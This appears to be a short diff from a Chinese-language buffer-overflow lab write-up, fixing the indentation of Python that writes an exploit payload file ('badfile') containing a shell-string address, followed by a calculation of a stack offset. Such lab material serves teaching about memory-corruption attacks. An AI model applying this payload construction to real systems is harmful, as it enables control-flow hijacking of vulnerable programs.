@@ -98,7 +98,7 @@ content[X:X+4] = (sh_addr).to_bytes(4,byteorder='little')
 
 ## Save content to a file
 with open("badfile", "wb") as f:
-f.write(content)
+    f.write(content)
 ```
 
 其中，Y 的值为 `0xffffcd78`$$-$$`0xffffcd60`$$+4$$
